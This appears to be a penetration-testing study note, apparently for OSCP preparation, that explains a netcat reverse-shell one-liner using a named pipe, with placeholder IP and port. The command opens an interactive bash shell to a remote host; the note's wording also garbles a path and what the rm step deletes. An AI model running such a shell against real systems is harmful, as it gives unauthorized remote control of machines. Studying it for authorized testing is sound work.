---
permalink: oscp/techniques/shells-and-payloads/oneliners-explained
title: Oneliners Explained
type: note
---

## Bash Oneliners

### Netcat Reverse Shell
```bash
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc <IP> <PORT> > tmp/f
```
- `rm -f /tmp/f` deletes `tmp` if it already exists
- `mkfifo /tmp/f` creates a named pipe (FIFO), used to pass data between processes
- `cat /tmp/f` reads commands from the pipe
- `/bin/bash -i` starts a interactive bash shell
- `2>&1` combines error messages with normal output


